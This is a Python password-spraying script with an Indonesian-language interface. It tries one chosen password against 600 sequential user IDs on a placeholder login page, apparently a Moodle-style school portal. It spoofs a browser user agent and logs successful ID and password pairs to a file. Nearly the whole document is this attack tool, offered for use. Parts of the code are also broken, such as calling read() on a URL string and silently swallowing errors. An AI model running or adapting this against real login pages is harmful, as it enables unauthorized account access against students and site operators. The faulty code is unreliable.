import mechanize
import http.cookiejar as cookielib
import sys
import datetime
import os
from colorama import init, Fore, Back



RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"


class Brute:

	"""                                                                                           
@@@@@@@   @@@@@@@   @@@  @@@  @@@@@@@  @@@@@@@@  @@@@@@@      @@@@@@@    @@@@@@   @@@ @@@  
@@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@@  @@@@@@@@     @@@@@@@@  @@@@@@@@  @@@ @@@  
@@!  @@@  @@!  @@@  @@!  @@@    @@!    @@!       @@!  @@@     @@!  @@@  @@!  @@@  @@! !@@  
!@   @!@  !@!  @!@  !@!  @!@    !@!    !@!       !@!  @!@     !@   @!@  !@!  @!@  !@! @!!  
@!@!@!@   @!@!!@!   @!@  !@!    @!!    @!!!:!    @!@!!@!      @!@!@!@   @!@  !@!   !@!@!   
!!!@!!!!  !!@!@!    !@!  !!!    !!!    !!!!!:    !!@!@!       !!!@!!!!  !@!  !!!    @!!!   
!!:  !!!  !!: :!!   !!:  !!!    !!:    !!:       !!: :!!      !!:  !!!  !!:  !!!    !!:    
:!:  !:!  :!:  !:!  :!:  !:!    :!:    :!:       :!:  !:!     :!:  !:!  :!:  !:!    :!:    
 :: ::::  ::   :::  ::::: ::     ::     :: ::::  ::   :::      :: ::::  ::::: ::     ::    
:: : ::    :   : :   : :  :      :     : :: ::    :   : :     :: : ::    : :  :      :     
                                        

                                                                                         """
	init()

	sys.stdout.write(RED)
	print(__doc__)

	def time(self):
		current_time = datetime.datetime.now()
		return current_time.microsecond

	def random_id(self, start):
		f = [start]

		for i in range(599):
			a = int(f[0 + i])
			a += 1
			f.append(str(a))

		return f


	def __init__(self, uname, paswd):
		self.br = mechanize.Browser()
		self.username = self.random_id(uname)
		self.password = paswd
		self.eror_ind = 'Kesalahan saat login, silahkan ulang lagi'
		self.eror_en = 'Invalid login, please try again'
		self.cj = cookielib.CookieJar()
		self.timevar = self.time()
		self.result = open('result-{}.txt'.format(self.timevar) ,'a')
		self.target = 'https://yourtargethare/login/index.php'


	def login(self):
		target = self.target.read()
		self.br.addheaders = [("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]
		self.br.open(target)
		self.br.set_cookiejar(self.cj)
		sys.stdout.write(RED + BOLD)
		print('target: ' + target)
		print('result on result-{}.txt'.format(self.timevar))

		for i in self.username:
			try:

				self.br.select_form(nr = 0)
				self.br['username'] = str(i)
				self.br['password'] = str(self.password)
				login = self.br.submit()
				login_cek = login.read()
				sys.stdout.write(RESET)

				if self.eror_ind.encode() in login_cek:
					sys.stdout.write(Back.RED)
					sys.stdout.write('[#] {} gagal dengan password {} \n'.format(i,self.password))
				else:
					sys.stdout.write(Back.GREEN)
					self.result.write('{}|{}  \n'.format(i,self.password))
					self.cj.clear()
					self.br.open(self.target)
					sys.stdout.write('[#] {} berhasil dengan password {} \n'.format(i,self.password))
			
			except:
				print

idn = str(input('id mulai dari: '))
password = str(input('password: '))
					

Brute(idn,password).login()

